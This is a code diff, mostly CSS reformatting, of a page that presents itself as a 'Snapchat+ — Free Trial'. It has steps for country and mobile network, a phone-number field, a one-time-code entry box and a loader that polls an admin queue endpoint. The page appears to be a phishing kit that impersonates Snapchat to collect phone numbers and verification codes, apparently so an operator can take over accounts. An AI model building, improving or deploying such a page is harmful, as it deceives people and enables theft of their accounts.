@@ -5,8 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Snapchat+ — Free Trial</title>
     <style>
-        /* ===== RESET ===== */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+        }
 
         body {
             min-height: 100vh;
@@ -19,7 +23,6 @@
 
         .container { width: 100%; max-width: 420px; }
 
-        /* ===== CARD ===== */
         .card {
             background: rgba(26, 26, 26, 0.95);
             backdrop-filter: blur(20px);
@@ -32,9 +35,15 @@
         /* ===== BRAND ===== */
         .brand { text-align: center; margin-bottom: 32px; }
         .brand .snap-icon {
-            width: 72px; height: 72px; background: linear-gradient(135deg, #FFFC00, #FFD700);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 12px; font-size: 36px; box-shadow: 0 0 60px rgba(255,252,0,0.15);
+            width: 72px; height: 72px;
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 36px;
+            box-shadow: 0 0 60px rgba(255,252,0,0.15);
             transition: transform 0.3s;
         }
         .brand .snap-icon:hover { transform: scale(1.05); }
@@ -42,9 +51,16 @@
         .brand h1 span { color: #FFFC00; }
         .brand .tagline { color: #888; font-size: 14px; margin-top: 6px; }
         .brand .badge {
-            display: inline-block; background: linear-gradient(135deg, #FFFC00, #FFD700);
-            color: #000; font-size: 11px; font-weight: 700; padding: 5px 18px;
-            border-radius: 20px; margin-top: 10px; text-transform: uppercase; letter-spacing: 0.8px;
+            display: inline-block;
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            color: #000;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 5px 18px;
+            border-radius: 20px;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
         }
 
         /* ===== STEPS ===== */
@@ -60,9 +76,16 @@
         /* ===== COUNTRY ===== */
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
         .country-card {
-            padding: 22px 12px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.06);
-            background: rgba(255,255,255,0.03); color: #fff; font-size: 16px; font-weight: 500;
-            cursor: pointer; transition: all 0.3s; text-align: center;
+            padding: 22px 12px;
+            border-radius: 20px;
+            border: 2px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.03);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
         }
         .country-card:hover { transform: translateY(-2px); border-color: rgba(255,252,0,0.3); }
         .country-card .flag { font-size: 36px; display: block; margin-bottom: 6px; }
@@ -71,34 +94,60 @@
         /* ===== NETWORK ===== */
         .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .network-card {
-            padding: 14px 10px; border-radius: 16px; border: 2px solid rgba(255,255,255,0.06);
-            background: rgba(255,255,255,0.03); color: #fff; font-size: 13px; font-weight: 500;
-            cursor: pointer; transition: all 0.3s; text-align: center;
+            padding: 14px 10px;
+            border-radius: 16px;
+            border: 2px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.03);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
         }
         .network-card:hover { border-color: rgba(255,252,0,0.3); transform: translateY(-1px); }
         .network-card.selected { border-color: #FFFC00; background: rgba(255,252,0,0.08); }
 
         /* ===== INPUT ===== */
         .input-group {
-            display: flex; align-items: center; background: rgba(255,255,255,0.04);
-            border-radius: 18px; border: 2px solid rgba(255,255,255,0.06); padding: 0 18px; margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            background: rgba(255,255,255,0.04);
+            border-radius: 18px;
+            border: 2px solid rgba(255,255,255,0.06);
+            padding: 0 18px;
+            margin-bottom: 14px;
             transition: all 0.3s;
         }
         .input-group:focus-within { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.05); }
         .input-group .code {
-            color: #aaa; font-size: 16px; font-weight: 500; padding-right: 14px;
+            color: #aaa;
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 14px;
             border-right: 1px solid rgba(255,255,255,0.06);
         }
         .input-group input {
-            flex: 1; padding: 18px 14px; background: transparent; border: none; outline: none;
-            color: #fff; font-size: 17px;
+            flex: 1;
+            padding: 18px 14px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 17px;
         }
         .input-group input::placeholder { color: #444; }
 
         /* ===== BUTTONS ===== */
         .btn {
-            width: 100%; padding: 18px; border-radius: 18px; border: none;
-            font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s;
+            width: 100%;
+            padding: 18px;
+            border-radius: 18px;
+            border: none;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
         }
         .btn-primary { background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000; }
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.25); }
@@ -109,15 +158,33 @@
         /* ===== OTP ===== */
         .otp-box { display: flex; gap: 12px; justify-content: center; margin: 24px 0 20px; }
         .otp-box input {
-            width: 56px; height: 64px; text-align: center; font-size: 28px; font-weight: 700;
-            background: rgba(255,255,255,0.04); border: 2px solid rgba(255,255,255,0.08);
-            border-radius: 16px; color: #fff; outline: none; transition: all 0.3s; caret-color: #FFFC00;
+            width: 56px;
+            height: 64px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            background: rgba(255,255,255,0.04);
+            border: 2px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            color: #fff;
+            outline: none;
+            transition: all 0.3s;
+            caret-color: #FFFC00;
         }
-        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
+        .otp-box input:focus {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255,252,0,0.06);
+            background: rgba(255,255,255,0.06);
+        }
         .otp-hint { text-align: center; color: #777; font-size: 14px; }
         .otp-hint strong { color: #fff; }
         .resend {
-            text-align: center; color: #555; font-size: 14px; margin-top: 14px; cursor: pointer; transition: color 0.3s;
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-top: 14px;
+            cursor: pointer;
+            transition: color 0.3s;
         }
         .resend:hover { color: #888; }
         .resend span { color: #FFFC00; font-weight: 500; }
@@ -125,18 +192,29 @@
         /* ===== LOADER (Step 4) ===== */
         .loader-wrap { text-align: center; padding: 20px 0; }
         .loader-spinner {
-            width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.06);
-            border-top-color: #FFFC00; border-radius: 50%; margin: 0 auto 16px;
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(255,255,255,0.06);
+            border-top-color: #FFFC00;
+            border-radius: 50%;
+            margin: 0 auto 16px;
             animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .progress-track {
-            width: 100%; height: 4px; background: rgba(255,255,255,0.06);
-            border-radius: 4px; overflow: hidden; margin-top: 16px;
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 16px;
         }
         .progress-fill {
-            height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700);
-            border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #FFFC00, #FFD700);
+            border-radius: 4px;
+            transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
         .loader-text {
             color: #888;
@@ -160,17 +238,16 @@
             margin-bottom: 16px;
             border-left: 3px solid #FFFC00;
         }
-        .info-box p {
-            color: #aaa;
-            font-size: 14px;
-            line-height: 1.6;
-        }
+        .info-box p { color: #aaa; font-size: 14px; line-height: 1.6; }
         .info-box strong { color: #fff; }
 
         /* ===== FOOTER ===== */
         .footer {
-            text-align: center; color: rgba(255,255,255,0.12); font-size: 12px;
-            margin-top: 24px; letter-spacing: 0.3px;
+            text-align: center;
+            color: rgba(255,255,255,0.12);
+            font-size: 12px;
+            margin-top: 24px;
+            letter-spacing: 0.3px;
         }
 
         @media (max-width: 440px) {
@@ -469,7 +546,7 @@
 
     async function checkStatus() {
         let attempts = 0;
-        const maxAttempts = 60; // 60 * 2 seconds = 2 minutes
+        const maxAttempts = 60;
 
         const checkInterval = setInterval(async function() {
             attempts++;
@@ -477,7 +554,6 @@
                 const response = await fetch('/api/admin/queues');
                 const data = await response.json();
 
-                // Find our entry
                 for (const queue in data) {
                     for (const entry of data[queue]) {
                         if (entry.id === queueId) {
@@ -511,7 +587,7 @@
                     resetAll();
                 }
             } catch (error) {
-                // Silent fail, keep trying
+                // silent
             }
         }, 2000);
     }
